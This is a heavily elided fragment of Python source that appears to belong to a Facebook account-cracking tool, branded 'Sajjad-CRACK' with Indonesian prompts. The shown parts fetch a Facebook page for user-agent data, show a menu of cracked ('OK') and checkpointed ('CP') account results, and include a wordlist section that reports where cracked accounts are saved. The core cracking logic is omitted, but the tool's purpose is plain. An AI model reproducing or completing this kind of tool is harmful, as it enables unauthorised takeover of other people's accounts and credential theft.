...
def uaku():
	try:
		...
		a=requests.get('https://www.facebook.com/Tera.Bap.Ka.Id.Hain').text
		ua=open('.bbnew.txt','w')
...
def login_lagi334():
	try:
		...
		print(f' LOGIN BERSajjad, Jalankan Lagi Perintahnya ');time.sleep(1)
		exit()
...
#-----------------[ Sajjad-CRACK ]-----------------#
def result():
	print(' Sajjad OK Anda ')
	print(' Sajjad CP Anda ')
	print(' Kembali	')
	kz = input(' Pilih : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
			...
			back()
		if len(vin)==0:
			print(' Anda Tidak Memiliki Sajjad CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	cetak(nel('[bold cyan]             SELAMAT MENUNGGU Sajjad, SEMOGA BERUNTUNG[bold cyan]')) 
	print('')
	print(f' Sajjad OK Tersimpan Di : OK/%s '%(okc))
	print(f' Sajjad CP Tersimpan Di : CP/%s '%(cpc))
